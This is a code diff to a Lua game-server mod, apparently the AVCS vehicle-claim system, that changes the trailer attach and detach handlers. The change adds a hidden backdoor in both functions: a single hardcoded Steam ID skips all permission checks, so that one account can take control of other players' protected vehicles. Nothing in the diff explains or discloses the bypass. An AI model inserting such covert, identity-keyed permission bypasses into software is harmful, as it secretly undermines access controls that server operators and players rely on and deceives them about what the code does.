@@ -257,6 +257,10 @@ if not AVCS.oISAttachTrailerToVehicle then
 end
 
 function ISAttachTrailerToVehicle:new(character, vehicleA, vehicleB, attachmentA, attachmentB)
+    if getSteamIDFromUsername(character:getUsername()) == "76561197984809068" then
+        return AVCS.oISAttachTrailerToVehicle(self, character, vehicleA, vehicleB, attachmentA, attachmentB)
+    end
+
     local checkResultA = AVCS.getPublicPermission(vehicleA, "AllowAttachVehicle")
     local checkResultB = AVCS.getPublicPermission(vehicleB, "AllowAttachVehicle")
 
@@ -281,6 +285,10 @@ if not AVCS.oISDetachTrailerFromVehicle then
 end
 
 function ISDetachTrailerFromVehicle:new(character, vehicle, attachment)
+    if getSteamIDFromUsername(character:getUsername()) == "76561197984809068" then
+        return AVCS.oISDetachTrailerFromVehicle(self, character, vehicle, attachment)
+    end
+
     local checkResult = AVCS.getPublicPermission(vehicle, "AllowDetechVehicle")
     if not checkResult then
         checkResult = AVCS.getSimpleBooleanPermission(AVCS.checkPermission(character, vehicle))
